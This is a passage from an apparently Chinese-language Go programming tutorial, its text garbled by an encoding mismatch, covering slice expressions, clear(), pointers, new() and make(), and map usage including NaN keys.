title="æ‹“å±•è¡¨è¾¾"></a>æ‹“å±•è¡¨è¾¾</h2><p><strong>åªæœ‰åˆ‡ç‰‡æ‰èƒ½ä½¿ç”¨æ‹“å±•è¡¨è¾¾</strong>ï¼Œè§£å†³åˆ‡ç‰‡å…±äº«åº•å±‚æ•°ç»„çš„è¯»å†™é—®é¢˜</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">slice[low:high:max]</span><br><span class="hljs-section">low: èµ·å§‹ç´¢å¼•</span><br><span class="hljs-section">high: ç»“æŸç´¢å¼•(ä¸åŒ…å«)</span><br><span class="hljs-section">max: æœ€å¤§å®¹é‡</span><br></code></pre></td></tr></table></figure><p>åƒå‰é¢è¯´çš„ï¼Œs1 å’Œ s2 å…±äº«çš„æ˜¯ä¸€ä¸ªåº•å±‚æ•°ç»„ï¼Œé‚£ä¹ˆå¯¹ s2 è¿›è¡Œæ”¹å˜æ—¶ä¹Ÿä¼šå¯¹ s1 æœ‰å½±å“ï¼Œæ¯”å¦‚è¯´</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br>s2 := s1[<span class="hljs-number">3</span>:<span class="hljs-number">4</span>]<br>s2 = <span class="hljs-built_in">append</span>(s2, <span class="hljs-number">1</span>)<br>fmt.Println(s2)<br>fmt.Println(s1)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">7</span> <span class="hljs-number">1</span>]<br>[<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">1</span> <span class="hljs-number">9</span>]<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå°±ä¼šå½±å“ s1 çš„æ•°æ®ï¼Œå‘ s2 æ·»åŠ å…ƒç´ ï¼ŒæŠŠ s1 æ›´æ”¹äº†ï¼Œè¿™ä¸ªæ—¶å€™ç”¨æ‹“å±•è¡¨è¾¾å¼å°±èƒ½è§£å†³äº†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">s2 := s1[<span class="hljs-number">3</span>:<span class="hljs-number">4</span>:<span class="hljs-number">4</span>]<br>&gt;&gt;<br>[<span class="hljs-number">7</span> <span class="hljs-number">1</span>]<br>[<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br></code></pre></td></tr></table></figure><h2 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h2><p>clear() ä¼šå°†åˆ‡ç‰‡å†…æ‰€æœ‰çš„å€¼ç½®ä¸ºé›¶å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>clear(s)<br>fmt.Println(s)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>æ¸…ç©ºåˆ‡ç‰‡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  s := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>    s = s[:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>]<br>  fmt.Println(s)<br>&#125;<br>&gt;&gt;<br>[]<br></code></pre></td></tr></table></figure><h1 id="æŒ‡é’ˆ"><a href="#æŒ‡é’ˆ" class="headerlink" title="æŒ‡é’ˆ"></a>æŒ‡é’ˆ</h1><p>Go ä¸­æ˜¯æŒ‡é’ˆä¸èƒ½è¿›è¡Œåç§»å’Œè¿ç®—ï¼Œæœ‰ä¸¤ä¸ªå¸¸ç”¨æ“ä½œç¬¦ï¼šå–åœ°å€ç¬¦ <code>&amp;</code>ï¼Œè§£å¼•ç”¨ç¬¦ <code>*</code></p><h2 id="æŒ‡é’ˆåœ°å€"><a href="#æŒ‡é’ˆåœ°å€" class="headerlink" title="æŒ‡é’ˆåœ°å€"></a>æŒ‡é’ˆåœ°å€</h2><p>&amp; å–åœ°å€ï¼Œå–å˜é‡æŒ‡é’ˆ</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">ptr := <span class="hljs-variable">&amp;v</span><span class="hljs-comment">//v çš„ç±»å‹ä¸º T</span><br><span class="hljs-symbol">v:</span>è¢«å–åœ°å€çš„å˜é‡ï¼Œç±»å‹ä¸º T<br><span class="hljs-symbol">ptr:</span>æ¥æ”¶åœ°å€çš„å˜é‡ï¼Œptr çš„ç±»å‹ä¸º *Tï¼Œä¸º T çš„æŒ‡é’ˆç±»å‹<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br>b := &amp;a<br>fmt.Printf(<span class="hljs-string">&quot;a:%d ptr:%p\n&quot;</span>, a, &amp;a)<br>fmt.Printf(<span class="hljs-string">&quot;b:%p type:%T\n&quot;</span>, b, b)<br>fmt.Println(&amp;b)<br>&#125;<br>&gt;&gt;<br>a:<span class="hljs-number">10</span> ptr:<span class="hljs-number">0xc00008c098</span><br>b:<span class="hljs-number">0xc00008c098</span> <span class="hljs-keyword">type</span>:*<span class="hljs-type">int</span><br><span class="hljs-number">0xc000090048</span><br></code></pre></td></tr></table></figure><h2 id="æŒ‡é’ˆå–å€¼"><a href="#æŒ‡é’ˆå–å€¼" class="headerlink" title="æŒ‡é’ˆå–å€¼"></a>æŒ‡é’ˆå–å€¼</h2><p>å¯¹æ™®é€šå˜é‡ä½¿ç”¨ <code>&amp;</code> å–åœ°å€åä¼šè·å¾—è¿™ä¸ªå˜é‡çš„æŒ‡é’ˆï¼Œç„¶åå¯¹æŒ‡é’ˆä½¿ç”¨ <code>*</code> è§£å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯æŒ‡é’ˆå–å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br>b := &amp;a<br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, b)<br><br>c := *b<br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, c)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, c)<br>&#125;<br>&gt;&gt;<br>*<span class="hljs-type">int</span><br><span class="hljs-type">int</span><br><span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>  å–åœ°å€æ“ä½œç¬¦ <code>&amp;</code> å’Œå–å€¼æ“ä½œç¬¦ <code>*</code> æ˜¯ä¸€å¯¹äº’è¡¥æ“ä½œç¬¦ï¼Œ<code>&amp;</code> å–å‡ºåœ°å€ï¼Œ<code>*</code> æ ¹æ®åœ°å€å–å‡ºåœ°å€æŒ‡å‘çš„å€¼</p><p>è€Œä¸” <code>*</code> è¿˜èƒ½å£°æ˜æŒ‡é’ˆ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> numPtr *<span class="hljs-type">int</span><br>fmt.Println(numPtr)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>*int</code> ä»£è¡¨å˜é‡æ˜¯ <code>int</code> å‹æŒ‡é’ˆï¼ŒæŒ‡é’ˆå¿…é¡»è¦åˆå§‹åŒ–ï¼Œä¸ç„¶å°±æ˜¯ç©ºæŒ‡é’ˆï¼Œå¯ä»¥å–åœ°å€ç¬¦å°†å…¶ä»–å˜é‡çš„åœ°å€èµ‹ç»™è¯¥æŒ‡é’ˆï¼Œè¿˜èƒ½ä½¿ç”¨å†…ç½®å‡½æ•° <code>new</code>() æ‰‹åŠ¨åˆ†é…</p><h2 id="new"><a href="#new" class="headerlink" title="new()"></a>new()</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> numPtr *<span class="hljs-type">int</span><br>numPtr = <span class="hljs-built_in">new</span>(<span class="hljs-type">int</span>)<br>fmt.Println(numPtr)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">0xc00008c098</span><br></code></pre></td></tr></table></figure><p><code>new()</code> å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå‚æ•°ä¸ºç±»å‹ï¼Œè¿”å›ä¸€ä¸ªå¯¹åº”ç±»å‹çš„æŒ‡é’ˆï¼Œä¼šå¯¹æŒ‡é’ˆåˆ†é…å†…å­˜ï¼Œå¹¶ä¸”æŒ‡é’ˆæŒ‡å‘å¯¹åº”ç±»å‹çš„é›¶å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(*<span class="hljs-built_in">new</span>(<span class="hljs-type">string</span>))<br>fmt.Println(*<span class="hljs-built_in">new</span>(<span class="hljs-type">int</span>))<br>fmt.Println(*<span class="hljs-built_in">new</span>([<span class="hljs-number">5</span>]<span class="hljs-type">int</span>))<br>fmt.Println(*<span class="hljs-built_in">new</span>([]<span class="hljs-type">float64</span>))<br>&#125;<br>&gt;&gt;<br><br><span class="hljs-number">0</span><br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[]<br></code></pre></td></tr></table></figure><p>å˜é‡ã€æŒ‡é’ˆåœ°å€ã€æŒ‡é’ˆå˜é‡ã€å–åœ°å€ã€å–å€¼</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">å¯¹å˜é‡è¿›è¡Œå–åœ°å€ <span class="hljs-comment">(&amp;)</span>ï¼Œå¯ä»¥å¾—åˆ°å˜é‡çš„æŒ‡é’ˆå˜é‡<br>æŒ‡é’ˆå˜é‡å€¼ä¸ºæŒ‡é’ˆåœ°å€<br>æŒ‡é’ˆå˜é‡è¿›è¡Œå–å€¼ <span class="hljs-comment">(*)</span>ï¼Œå¯ä»¥å¾—åˆ°æŒ‡é’ˆå˜é‡æŒ‡å‘çš„åŸå˜é‡çš„å€¼<br></code></pre></td></tr></table></figure><p>æŒ‡é’ˆä¼ å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ptr1</span><span class="hljs-params">(x <span class="hljs-type">int</span>)</span></span> &#123;<br>x = <span class="hljs-number">100</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ptr2</span><span class="hljs-params">(x *<span class="hljs-type">int</span>)</span></span> &#123;<br>*x = <span class="hljs-number">100</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br>ptr1(a)<br>fmt.Println(a)<br>ptr2(&amp;a)<br>fmt.Println(a)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">10</span><br><span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>å€¼ä¼ é€’ä¸ä¼šå½±å“ a çš„å€¼ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡è¾“å‡º a çš„å€¼ä¸å˜</p><h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>å’Œ new() ä¸€æ ·ï¼Œæ˜¯ç”¨æ¥åˆ†é…å†…å­˜çš„ï¼Œä½†æ˜¯ä¸ new() æœ‰åŒºåˆ«çš„æ˜¯ï¼Œå®ƒåªç”¨äº sliceã€map å’Œ channel çš„å†…å­˜åˆ›å»ºï¼Œè¿”å›çš„ç±»å‹å°±æ˜¯è¿™ä¸‰ä¸ªç±»å‹æœ¬èº«ï¼Œè€Œä¸æ˜¯æŒ‡é’ˆç±»å‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">make</span><span class="hljs-params">(t Type,size ...IntegerType)</span></span> Type<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span><br>b = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>b[<span class="hljs-string">&quot;aaa&quot;</span>] = <span class="hljs-number">100</span><br>fmt.Println(b)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[aaa:<span class="hljs-number">100</span>]<br></code></pre></td></tr></table></figure><p><strong>åŒºåˆ«</strong></p><p>make() åªç”¨äº sliceã€map ä»¥åŠ channel çš„åˆå§‹åŒ–ï¼Œè¿”å›çš„è¿˜æ˜¯è¿™ä¸‰ä¸ªç±»å‹æœ¬èº«</p><p>new() ç”¨äºç±»å‹çš„å†…å­˜åˆ†é…ï¼Œå¹¶å¯¹å†…å­˜å¯¹åº”çš„å€¼ä¸ºç±»å‹é›¶å€¼ï¼Œè¿”å›æŒ‡å‘ç±»å‹çš„æŒ‡é’ˆ</p><h1 id="map"><a href="#map" class="headerlink" title="map"></a>map</h1><p>æ˜ å°„è¡¨çš„æ•°æ®ç»“æ„å®ç°é€šå¸¸ä¸¤ç§ï¼šå“ˆå¸Œè¡¨ (hash table ) å’Œæœç´¢æ ‘ (search tree)ï¼Œæ— åºå’Œæœ‰åºã€‚åœ¨ Go ä¸­ map çš„å®ç°æ˜¯åŸºäºå“ˆå¸Œæ¡¶ï¼Œæ‰€ä»¥ä¹Ÿæ— åºï¼Œå¿…é¡»è¦åˆå§‹åŒ–æ‰èƒ½ä½¿ç”¨</p><h2 id="åˆå§‹åŒ–-1"><a href="#åˆå§‹åŒ–-1" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">map</span>[KeyType]ValueType<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>scoreMap := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">8</span>)<br>scoreMap[<span class="hljs-string">&quot;butt3rf1y&quot;</span>] = <span class="hljs-number">100</span><br>scoreMap[<span class="hljs-string">&quot;butt3rf2y&quot;</span>] = <span class="hljs-number">90</span><br>fmt.Println(scoreMap)<br>fmt.Println(scoreMap[<span class="hljs-string">&quot;butt3rf2y&quot;</span>])<br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, scoreMap)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[butt3rf1y:<span class="hljs-number">100</span> butt3rf2y:<span class="hljs-number">90</span>]<br><span class="hljs-number">90</span><br><span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span><br></code></pre></td></tr></table></figure><p>map ç±»å‹çš„å˜é‡é»˜è®¤åˆå§‹å€¼ä¸º nilï¼Œéœ€è¦ç”¨ <code>make()</code> å‡½æ•°æ¥åˆ†é…å†…å­˜</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[KeyType]ValueType,[<span class="hljs-built_in">cap</span>])<br></code></pre></td></tr></table></figure><p>æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œç±»å‹ä¸åˆå§‹å®¹é‡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">mp1 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">8</span>)<br>mp2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>][]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><p>map æ•°æ®éƒ½æ˜¯æˆå¯¹å‡ºç°çš„ã€‚æ”¯æŒåœ¨å£°æ˜çš„æ—¶å¡«å……å…ƒç´ </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>&#123;<br><span class="hljs-number">0</span>: <span class="hljs-string">&quot;b&quot;</span>,<br><span class="hljs-number">1</span>: <span class="hljs-string">&quot;u&quot;</span>,<br><span class="hljs-number">2</span>: <span class="hljs-string">&quot;t&quot;</span>,<br><span class="hljs-number">3</span>: <span class="hljs-string">&quot;3&quot;</span>,<br>&#125;<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[<span class="hljs-number">0</span>:b <span class="hljs-number">1</span>:u <span class="hljs-number">2</span>:t <span class="hljs-number">3</span>:<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><h2 id="è®¿é—®"><a href="#è®¿é—®" class="headerlink" title="è®¿é—®"></a>è®¿é—®</h2><p>map çš„è®¿é—®å’Œæ•°ç»„é€šè¿‡ç´¢å¼•è®¿é—®å·®ä¸å¤šï¼Œé€šè¿‡ Key è®¿é—® Value</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br>fmt.Println(mp[<span class="hljs-string">&quot;a&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;b&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;c&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;d&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;e&quot;</span>])<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ä¸­å¹¶ä¸å­˜åœ¨ e çš„é”®å€¼å¯¹ï¼Œä½†æ˜¯ä¾ç„¶æœ‰è¿”å›å€¼ 0ï¼Œmap å¯¹äºä¸å­˜åœ¨çš„é”®è¿”å›å€¼æ˜¯å¯¹åº”ç±»å‹çš„<strong>é›¶å€¼</strong>ï¼Œå¹¶ä¸”åœ¨è®¿é—® map çš„æ—¶å€™å…¶å®æœ‰ä¸¤ä¸ªè¿”å›å€¼ï¼Œç¬¬ä¸€ä¸ªè¿”å›å¯¹åº”ç±»å‹çš„å€¼ï¼Œç¬¬äºŒä¸ªè¿”å›å€¼ä¸ºå¸ƒå°”å€¼ï¼Œä»£è¡¨é”®æ˜¯å¦å­˜åœ¨ï¼Œæ¯”å¦‚è¯´</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br><span class="hljs-keyword">if</span> val, exist := mp[<span class="hljs-string">&quot;e&quot;</span>]; exist &#123;<br>fmt.Println(val)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;ä¸å­˜åœ¨&quot;</span>)<br>&#125;<br>&#125;<br>&gt;&gt;<br>ä¸å­˜åœ¨<br></code></pre></td></tr></table></figure><p>æ±‚ map é•¿åº¦ç”¨ <code>len()</code> å‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">len</span>(mp)<br></code></pre></td></tr></table></figure><h2 id="å­˜å€¼"><a href="#å­˜å€¼" class="headerlink" title="å­˜å€¼"></a>å­˜å€¼</h2><p>ç±»ä¼¼æ•°ç»„å­˜å€¼ï¼Œå­˜å€¼æ—¶ä½¿ç”¨å·²å­˜åœ¨çš„é”®ä¼šè¦†ç›–åŸæœ‰çš„å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>mp[<span class="hljs-string">&quot;a&quot;</span>] = <span class="hljs-number">1</span><br>mp[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> _, exist := mp[<span class="hljs-string">&quot;b&quot;</span>]; exist &#123;<br>mp[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">3</span><br>&#125;<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[a:<span class="hljs-number">1</span> b:<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å½“é”®ä¸º <code>math.NaN()</code> æ—¶</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">float64</span>]<span class="hljs-type">string</span>, <span class="hljs-number">10</span>)<br>mp[math.NaN()] = <span class="hljs-string">&quot;a&quot;</span><br>mp[math.NaN()] = <span class="hljs-string">&quot;b&quot;</span><br>mp[math.NaN()] = <span class="hljs-string">&quot;c&quot;</span><br>_, exist := mp[math.NaN()]<br>fmt.Println(exist)<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-literal">false</span><br><span class="hljs-keyword">map</span>[NaN:c NaN:a NaN:b]<br></code></pre></td></tr></table></figure><p>ç›¸åŒçš„é”®å€¼å¹¶æ²¡æœ‰è¢«è¦†ç›–ï¼Œè€Œæ˜¯å¹¶å­˜ã€‚NaN çš„å®ç°æ˜¯ç”±åº•å±‚çš„æ±‡ç¼–æŒ‡ä»¤ <code>UCOMISD</code> å®Œæˆçš„ï¼Œè¿™æ˜¯ä¸€ä¸ªæ— åºæ¯”è¾ƒåŒç²¾åº¦æµ®ç‚¹æ•°çš„æŒ‡ä»¤ã€‚ä»»ä½•æ•°å­—éƒ½ä¸ç­‰äº NaNï¼ŒNaN 